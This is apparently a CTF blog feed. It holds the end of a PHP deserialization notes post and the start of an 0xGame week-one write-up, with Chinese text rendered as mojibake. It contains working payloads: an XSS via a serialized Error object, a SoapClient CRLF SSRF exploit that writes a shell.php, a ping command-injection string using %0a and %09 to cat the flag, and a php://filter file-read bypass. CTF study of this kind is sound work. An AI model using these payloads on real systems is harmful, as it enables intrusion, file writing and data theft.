class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™æ€è°ƒç”¨ç±»<code>A</code>çš„<code>test</code>æ–¹æ³•:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">A::<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;test&#x27;</span>]();</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_3_1.png"></p><p>åŠ¨æ€è°ƒç”¨ç±»<code>A</code>çš„<code>test</code>æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>())::<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>())-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line">[<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(),<span class="string">&#x27;test&#x27;</span>]();</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_3_2.png"></p><h1 id="åŸç”Ÿç±»ç›¸å…³"><a href="#åŸç”Ÿç±»ç›¸å…³" class="headerlink" title="åŸç”Ÿç±»ç›¸å…³"></a>åŸç”Ÿç±»ç›¸å…³</h1><h2 id="Cå¼€å¤´"><a href="#Cå¼€å¤´" class="headerlink" title="Cå¼€å¤´"></a>Cå¼€å¤´</h2><p>ç»• <code>wakeup</code> å’Œç»• <code>/^[Oa]:[/d]+/</code> è¿‡æ»¤ã€‚</p><p>è¯¦ç»†å¯ä»¥çœ‹ <code>wakeup</code> ç»•è¿‡æ€»ç»“çš„ <code>ä½¿ç”¨Cç»•è¿‡</code>ã€‚</p><p>ä»¥Cå¼€å¤´çš„åŸç”Ÿç±»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplDoublyLinkedList::unserialize</span><br><span class="line">SplQueue::unserialize</span><br><span class="line">SplStack::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h2><ul><li><h2 id="éå†æ–‡ä»¶ç›®å½•ç±»"><a href="#éå†æ–‡ä»¶ç›®å½•ç±»" class="headerlink" title="éå†æ–‡ä»¶ç›®å½•ç±»"></a>éå†æ–‡ä»¶ç›®å½•ç±»</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DirectoryIterator </span><br><span class="line">FilesystemIterator </span><br><span class="line">GlobIterator </span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ä¸ªéƒ½å¯ä»¥éå†æ–‡ä»¶ç›®å½•ï¼Œå¯ä»¥æ­é…ä¼ªåè®®ä½¿ç”¨ã€‚</p><p>å¯ä»¥ç”¨<code>glob://</code>ä¸”é…åˆ<code>*</code>æŸ¥æ‰¾ã€‚</p><p>æ³¨æ„ï¼Œè¿™å‡ ä¸ªç±»ä¸èƒ½ååºåˆ—åŒ–ã€‚</p><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$a</span> )&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_2_1.png"></p></li><li><h2 id="è¯»æ–‡ä»¶å†…å®¹"><a href="#è¯»æ–‡ä»¶å†…å®¹" class="headerlink" title="è¯»æ–‡ä»¶å†…å®¹"></a>è¯»æ–‡ä»¶å†…å®¹</h2><p><strong>SplFileObject</strong></p><p>å½“ç”¨æ–‡ä»¶ç›®å½•éå†åˆ°äº†æ•æ„Ÿæ–‡ä»¶æ—¶ï¼Œå¯ä»¥ç”¨<strong>SplFileObject</strong>ç±»ï¼Œ<strong>SplFileInfo</strong> ç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œã€‚</p><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$text</span>= <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;./flag.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$text</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_2_2.png"></p></li></ul><h2 id="hashç»•è¿‡å’ŒXSSå®ç°"><a href="#hashç»•è¿‡å’ŒXSSå®ç°" class="headerlink" title="hashç»•è¿‡å’ŒXSSå®ç°"></a>hashç»•è¿‡å’ŒXSSå®ç°</h2><p>è¿™é‡Œä¸»è¦æ˜¯ç”¨åŸç”Ÿç±»<code>Error</code>å’Œ<code>Exception</code>æ¥å®ç°ã€‚</p><p>å®ƒä»¬ä¸¤ä¸ªçš„ç”¨æ³•æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œä»¥<code>Error</code>ç±»ä½œä¸ºä¾‹å­è®²è§£</p><p>Errorä¸­ä¹Ÿæœ‰ä¸ª<code>__toString()</code>ï¼Œå¯ä»¥æ§åˆ¶å®ƒçš„å†…å®¹å®ç°å­—ç¬¦ä¸²çš„è¾“å‡ºã€‚</p><p>Errorå¯ä»¥ä¼ ä¸¤ä¸ªå‚æ•°ï¼Œæœ‰ä¸ªå‚æ•°å€¼çš„ä¸åŒåˆ™å¯¹è±¡ä¸åŒä¹Ÿå°±ä¸ç›¸ç­‰ï¼Œä½†å¯¹ç”±äº<code>__toString()</code>è¿”å›çš„å€¼ç›¸åŒmd5å’Œsha1åŠ å¯†åä¹Ÿç›¸åŒï¼Œæœ€åå¾—åˆ°çš„æ•°æ®ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å¯ä»¥è¾¾åˆ°hashç»•è¿‡ã€‚</p><ul><li><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>])</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss test&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//  O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A34%3A%22%3Cscript%3Ealert%28%27xss+test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A27%3A%22W%3A%5Cphpstudy_pro%5CWWW%5C114.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_3_1.png"></p></li><li><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;test&quot;</span>,<span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> !== <span class="variable">$b</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$a != $b&#x27;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5ç›¸ç­‰&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_3_2.png"></p></li></ul><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>åˆ©ç”¨<code>SoapClient</code>åŸç”Ÿç±»çš„ <code>__call</code>æ–¹æ³•è¿›è¡Œ<code>SSRF</code>ã€‚</p><p>ä½¿ç”¨å‰æï¼š</p><ol><li>éœ€è¦æœ‰soapæ‰©å±•ï¼Œä¸”ä¸æ˜¯é»˜è®¤å¼€å¯ï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯</li><li>éœ€è¦è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘å…¶__call()å‡½æ•°</li><li>ä»…é™äºhttp&#x2F;httpsåè®®</li></ol><p>æ­£å¸¸æƒ…å†µä¸‹çš„<code>SoapClient</code>ç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨<code>__call</code>æ–¹æ³•ã€‚</p><p><strong>CRLFæ”»å‡»</strong></p><p>ä»€ä¹ˆæ˜¯CRLFï¼Œå…¶å®å°±æ˜¯å›è½¦å’Œæ¢è¡Œé€ æˆçš„æ¼æ´ï¼Œåå…­è¿›åˆ¶ä¸º<code>0x0d,0x0a</code> ï¼Œåœ¨HTTPå½“ä¸­<code>header</code>å’Œ<code>body</code>ä¹‹é—´å°±æ˜¯ä¸¤ä¸ªCRLFåˆ†å‰²çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯cookieå’Œhtmlä»£ç ï¼Œæ‰€ä»¥crlf injection åˆå«åš HTTP Response Splittingã€‚</p><p><code>SoapClient</code> åœ¨è°ƒç”¨å‘é€æ•°æ®æ—¶ï¼Œå­˜åœ¨CRLFæ¼æ´ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶å…¶ä¸­ä¸€ä¸ªhttpå¤´æ¥æ„é€ å‡ºæˆ‘ä»¬æƒ³è¦çš„è¯·æ±‚åŒ…ã€‚</p><p><code>Content-Length</code>æ˜¯HTTPæ¶ˆæ¯é•¿åº¦ï¼Œå®ƒæŒ‡å®šå¤šå°‘ä¸ªå­—ç¬¦ï¼Œå°±è¯»å–å¤šå°‘ä¸ªå­—ç¬¦ï¼Œå¤šä½™çš„å­—ç¬¦ä¼šè¢«ä¸¢å¼ƒï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ§åˆ¶<code>Content-Length</code>çš„é•¿åº¦ï¼Œå°†æ²¡ç”¨çš„æ¶ˆæ¯å¿½ç•¥æ‰ã€‚</p><p>ä½¿ç”¨SoapClientååºåˆ—åŒ–+CRLF <strong>å¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚</strong> ã€‚</p><p>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="comment">// å¡«å…¥postçš„æ•°æ® </span></span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;a=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#x27;</span>;</span><br><span class="line"><span class="comment">// å¡«å…¥ä½ æƒ³è¦çš„httpå¤´</span></span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: aaaa=ssss&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_agent</span> = <span class="string">&#x27;aaa^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt; <span class="variable">$user_agent</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>, <span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;%26&#x27;</span>, <span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHPååºåˆ—åŒ–ä¸­wakeup()ç»•è¿‡æ€»ç»“</a></p><p><a href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD/Qb5uDAhaDcC7FeD&alichlgref=https://cn.bing.com/">æµ…æPHP GCåƒåœ¾å›æ”¶æœºåˆ¶åŠå¸¸è§åˆ©ç”¨æ–¹å¼</a></p><p><a href="https://zhuanlan.zhihu.com/p/405838002">PHPåºåˆ—åŒ–å†·çŸ¥è¯†</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247487933&idx=1&sn=e57bc3583c1b80f1aa7bd08409cfb82d">ä»qwb webshell é¢˜æ·±å…¥å¿«é€Ÿææ„</a></p><p><a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">æ„šäººæ¯3rd [easy_php]</a></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/123859246">PHPä¹‹åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼ˆåŸç”Ÿç±»åº”ç”¨ç¯‡ä¸Šï¼‰</a></p><p><a href="https://dar1in9s.github.io/2020/04/02/php/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">PHPåŸç”Ÿç±»çš„ååºåˆ—åŒ–åˆ©ç”¨</a></p><p><a href="https://blog.csdn.net/qq_43632414/article/details/120499159">PHPååºåˆ—åŒ–â€”â€”å­—ç¬¦é€ƒé€¸æ¼æ´ï¼ˆè‚¯å®šèƒ½çœ‹æ‡‚çš„ï¼ï¼‰</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> PHP </category>
          
          <category> çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
            <tag> çŸ¥è¯†åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame_week1</title>
      <link href="/0xGame-week1/"/>
      <url>/0xGame-week1/</url>
      
        <content type="html"><![CDATA[<h1 id="0xGame-week1"><a href="#0xGame-week1" class="headerlink" title="0xGame_week1"></a>0xGame_week1</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>F12ï¼Œç‚¹å‡»æºä»£ç &#x2F;æ¥æºï¼ŒæŸ¥çœ‹jsæ–‡ä»¶ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><img src="/0xGame-week1/w_2_1.png"></p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>æŸ¥çœ‹æºç ï¼Œçœ‹åˆ°æç¤ºã€‚</p><p><img src="/0xGame-week1/w_1_1.png"></p><p>æŒ‰ç…§æç¤ºè®¿é—®<code>/api.php?source</code>ï¼Œå³å¯å¾—åˆ°æºç  ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;No IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">sanitize</span>(<span class="variable">$ip</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ping -c 4 &#x27;</span>.<span class="variable">$ip</span>. <span class="string">&#x27; 2&gt;&amp;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±æºç å¯çŸ¥ï¼Œè¿‡æ»¤äº†<code>flag</code>ã€<code>;</code>ã€<code> ç©ºæ ¼( )</code>ã€<code>/</code>ã€‚</p><p>ä½¿ç”¨ <code>å›è½¦(%0a)</code> ä»£æ›¿<code>;</code>æˆªæ–­å‘½ä»¤ã€‚ç”¨ <code>tab(%09)</code> ä»£æ›¿ç©ºæ ¼ï¼Œä½¿ç”¨cdå‘½ä»¤ä¸€ç›´è·³è½¬åˆ°æ ¹ç›®å½•å³å¯æŸ¥çœ‹flagã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1%0acd%09..%0acd%09..%0acd%09..%0acat%09f*%0a</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/w_1_2.png"></p><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨æ•°ç»„ç»•md5ï¼Œç”¨å°æ•°+å­—ç¬¦ç»•è¿‡<code>if (!is_numeric($c) &amp;&amp; $c != 1024 &amp;&amp; intval($c) == 1024)</code>ï¼Œç”¨ä¼ªåè®®è¯»flag.phpï¼Œbase64è§£ç åå³å¯å¾—åˆ°flagã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get: url/?a[]=1&amp;b[]=2</span><br><span class="line">post: c=1024.11a</span><br><span class="line">cookie: name=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/w_3_1.png"></p><h2 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h2><ol><li><p>getä¼ <code>query=ctf</code>;</p></li><li><p>postä¼ <code>action=getflag</code>;</p></li><li><p>cookieä¼ <code>role=admin</code>ï¼›</p></li><li><p>æ·»åŠ <code>X-Forwarded-For: 127.0.0.1</code>;</p></li><li><p>ä¿®æ”¹<code>User-Agent</code>ä¸º<code>HarmonyOS Browser</code>ï¼›</p></li><li><p>æ·»åŠ <code>Referer: ys.mihoyo.com</code>ã€‚</p><p><img src="/0xGame-week1/w_4_1.png"></p></li></ol><h2 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h2><p>ç”¨<code>dirsearch</code>æ‰«æï¼Œå‘ç°æœ‰<code>.git</code>æ³„éœ²ã€‚</p><p>ä½¿ç”¨ <a href="https://github.com/BugScanTeam/GitHack#githack">GitHack</a> ä¸‹è½½æºç ã€‚</p><p><img src="/0xGame-week1/w_5_1.png"></p><p>ç„¶åè¿›å…¥<code>dist/124.71.184.68_50013</code>ï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥<code>git log</code>ï¼Œå¯ä»¥çœ‹åˆ°å†å²ç‰ˆæœ¬ã€‚</p><p><img src="/0xGame-week1/w_5_2.png"></p><p>è¾“å…¥<code>git show</code>ï¼Œå³å¯æ‰¾åˆ°flagã€‚</p><p><img src="/0xGame-week1/w_5_3.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="BabyRSA"><a href="#BabyRSA" class="headerlink" title="BabyRSA"></a>BabyRSA</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getN</span>():</span><br><span class="line">N = <span class="number">1</span></span><br><span class="line"><span 